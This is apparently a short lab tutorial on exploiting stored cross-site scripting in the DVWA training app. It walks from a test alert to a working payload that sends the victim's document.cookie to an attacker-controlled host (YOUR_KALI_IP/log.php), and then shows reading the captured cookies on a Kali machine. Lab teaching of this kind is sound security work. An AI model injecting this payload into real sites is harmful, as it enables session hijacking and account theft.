Injecting and Capturing Stored XSS

From Payload Injection to Cookie Verification

Step 1: Identify Stored XSS

Navigate to a vulnerable stored XSS page (e.g., DVWA). Test with a simple alert:

<script>alert('XSS Test');</script>

If an alert appears on refresh or for other users, the page is vulnerable.

Step 2: Inject Cookie Theft Payload

Craft and submit the cookie theft payload (replace YOUR_KALI_IP):

<script>window.location='http://YOUR_KALI_IP/log.php?cookie='+document.cookie;</script>

Submit this into the vulnerable input field (e.g., comment section).

Step 3: Simulate Victim Interaction

Open a different browser or incognito window on the target VM.

Navigate to the vulnerable page where you injected the stored XSS payload. The victim's browser will execute the script.

Step 4: Verify Stolen Cookie

On your Kali VM, check the cookies.txt file:

cat /var/www/html/cookies.txt

You should see the victim's stolen cookie string logged, confirming a successful attack.

Key Takeaway

Successfully exploiting stored XSS for cookie theft involves injecting a malicious payload, triggering it via victim interaction, and verifying the captured cookie on the attacker's server.
